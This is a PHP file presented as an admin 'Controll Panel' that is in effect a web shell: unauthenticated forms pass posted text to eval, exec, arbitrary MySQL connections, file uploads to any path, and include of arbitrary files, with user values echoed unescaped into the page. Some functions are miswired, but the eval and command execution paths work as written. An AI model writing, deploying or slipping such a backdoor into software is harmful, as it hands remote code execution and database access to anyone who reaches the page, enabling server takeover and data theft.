<?php 
/*
** ### Controll Panel of New Order ###
** Copyright Adam Borucki 2018
** Published on MIT License
*/
	/*
	
	$_GET - autorization, verify, crypto (in planning, with JS implementations)
	$_POST - {
		send commands
		query for data
		configuration (in plans, before JS)
		file inclusion
	}
	
	*/
	$file_alias='send_file';
	$command_alias='command';
	$include_alias='include';
	$commands=array(
		'eval'=>array(
			'alias'=>'eval'
		),
		'cmd'=>array(
			'alias'=>'cmd'
		),
		'mysql'=>array(
			'alias'=>'mysql'
		),
		'file'=>array(
			'alias'=>'file'
		)
	);
	$arg_alias=array(
		'arg0',
		'arg1',
		'arg2',
		'arg3',
		'arg4',
		'arg5'
	);
	function evaluator($string='',$strict=false){
		if($strict){
			$string=trim($string);
		}
		if($string){
			eval($string);
		}
	}
	function execute($command){
		$ret=array(
			'return'=>'',
			'output'=>array()
		);
		exec($command, $ret['output'], $ret['return']);
		return $ret;
	}
	function mysql_query_execution($host='localhost', $user='root', $password='', $database='db',$query='SELECT 1', $printmode=true){
		$conn=mysqli_connect($host,$user,$password,$database);
		if(mysqli_connect_errno()){
			die();
		}
		if($printmode){
			$result=mysqli_query($conn, $query);
			$ret=array();
			while($row=mysqli_fetch_assoc($result)){
				$ret[]=$row;
			}
			$conn->close();
			return $ret;
		}else{
			mysqli_query($conn, $query);
			$conn->close();
		}
	}
	function files_upload($alias,$path){
		if(isset($_FILES[$alias])){
			if(is_uploaded_file($_FILES[$alias]['tmp_name'])){
				move_uploaded_file($_FILES[$alias]['tmp_name'], $path);
			}
		}
	}
	function decrypt_string($string){
		return $string;
	}
	if(isset($_POST[$include_alias])){
		foreach($_POST[$include_alias] as $v){
			include decrypt_string($v);
		}
	}
	if(isset($_POST[$command_alias])){
		switch($_POST[$command_alias]){
			case $commands['eval']['alias']:
				echo '<pre>';
				var_dump(evaluator(
					decrypt_string($_POST[$arg_alias[0]])
				));
				echo '</pre>';
			break;
			case $commands['cmd']['alias']:
				echo '<pre>';
				var_dump(execute(
					decrypt_string($_POST[$arg_alias[0]])
				));
				echo '</pre>';
			break;
			case $commands['mysql']['alias']:
				echo '<pre>';
				var_dump(mysql_query_execution(
					decrypt_string($_POST[$arg_alias[0]]),
					decrypt_string($_POST[$arg_alias[1]]),
					decrypt_string($_POST[$arg_alias[2]]),
					decrypt_string($_POST[$arg_alias[3]]),
					decrypt_string($_POST[$arg_alias[4]])
				));
				echo '</pre>';
			break;
			case $commands['file']['alias']:
				echo '<pre>';
				var_dump(file_upload(
					$file_alias,
					decrypt_string($_POST[$arg_alias[0]])
				));
				echo '</pre>';
			break;
			default:
				
		}
	}
?>
<h1 style="font-size:60px">Controll Panel of New Order</h1>
<div style="float:left;width:200px">
	<h3>EVALUATOR</h3>
	<form method="POST">
		<?php if(isset($_POST[$include_alias])){foreach($_POST[$include_alias] as $v){ ?>
			<input type="hidden" name="<?php echo $include_alias; ?>[]" value="<?php echo $v; ?>"><br>
		<?php }} ?>
		<input type="hidden" name="<?php echo $command_alias; ?>" value="<?php echo $commands['eval']['alias']; ?>"><br>
		<textarea placeholder="PHP code" name="<?php echo $arg_alias[0]; ?>"></textarea><br>
		<input type="submit">
	</form>
	<br>
</div>
<div style="float:left;width:200px">
	<h3>EXECUTOR</h3>
	<form method="POST">
		<?php if(isset($_POST[$include_alias])){foreach($_POST[$include_alias] as $v){ ?>
			<input type="hidden" name="<?php echo $include_alias; ?>[]" value="<?php echo $v; ?>"><br>
		<?php }} ?>
		<input type="hidden" name="<?php echo $command_alias; ?>" value="<?php echo $commands['cmd']['alias']; ?>"><br>
		<textarea placeholder="shell/cmd command" name="<?php echo $arg_alias[0]; ?>"></textarea><br>
		<input type="submit">
	</form>
	<br>
</div>
<div style="float:left;width:200px">
	<h3>SQL QUERATOR</h3>
	<form method="POST">
		<?php if(isset($_POST[$include_alias])){foreach($_POST[$include_alias] as $v){ ?>
			<input type="hidden" name="<?php echo $include_alias; ?>[]" value="<?php echo $v; ?>"><br>
		<?php }} ?>
		<input type="hidden" name="<?php echo $command_alias; ?>" value="<?php echo $commands['mysql']['alias']; ?>"><br>
		<input placeholder="host" name="<?php echo $arg_alias[0]; ?>"><br>
		<input placeholder="user" name="<?php echo $arg_alias[1]; ?>"><br>
		<input placeholder="password" name="<?php echo $arg_alias[2]; ?>"><br>
		<input placeholder="database" name="<?php echo $arg_alias[3]; ?>"><br>
		<textarea placeholder="query" name="<?php echo $arg_alias[4]; ?>"></textarea><br>
		<input type="submit">
	</form>
	<br>
</div>
<div style="float:left;width:200px">
	<h3>FILE UPLOADER</h3>
	<form method="POST" enctype="multipart/form-data">
		<?php if(isset($_POST[$include_alias])){foreach($_POST[$include_alias] as $v){ ?>
			<input type="hidden" name="<?php echo $include_alias; ?>[]" value="<?php echo $v; ?>"><br>
		<?php }} ?>
		<input type="hidden" name="<?php echo $command_alias; ?>" value="<?php echo $commands['cmd']['alias']; ?>"><br>
		<input type="file" name="<?php echo $file_alias; ?>"><br>
		<input placeholder="destination" name="<?php echo $arg_alias[0]; ?>"><br>
		<input type="submit">
	</form>
</div>
<div style="clear:both;"></div>
<div style="float:left;width:200px">
	<h3>DEINCLUDER</h3>
	<form method="POST">
		<input type="submit">
	</form>
	<br>
</div>
<div style="float:left;width:200px">
	<h3>CONFIGURATOR</h3>
	(comming soon...)
</div>
<div style="float:left;width:200px">
	<h3>INCLUDER</h3>
	<form method="POST">
		<input name="<?php echo $include_alias; ?>[]" value="<?php if(isset($_POST[$include_alias][0])) echo $_POST[$include_alias][0]; ?>"><br>
		<input name="<?php echo $include_alias; ?>[]" value="<?php if(isset($_POST[$include_alias][1])) echo $_POST[$include_alias][1]; ?>"><br>
		<input name="<?php echo $include_alias; ?>[]" value="<?php if(isset($_POST[$include_alias][2])) echo $_POST[$include_alias][2]; ?>"><br>
		<input name="<?php echo $include_alias; ?>[]" value="<?php if(isset($_POST[$include_alias][3])) echo $_POST[$include_alias][3]; ?>"><br>
		<input name="<?php echo $include_alias; ?>[]" value="<?php if(isset($_POST[$include_alias][4])) echo $_POST[$include_alias][4]; ?>"><br>
		<input name="<?php echo $include_alias; ?>[]" value="<?php if(isset($_POST[$include_alias][5])) echo $_POST[$include_alias][5]; ?>"><br>
		<input name="<?php echo $include_alias; ?>[]" value="<?php if(isset($_POST[$include_alias][6])) echo $_POST[$include_alias][6]; ?>">
		<input type="submit">
	</form>
	<br>
</div>
<div style="clear:both;"></div>
<a href="">OPEN SOURCE CODE</a>
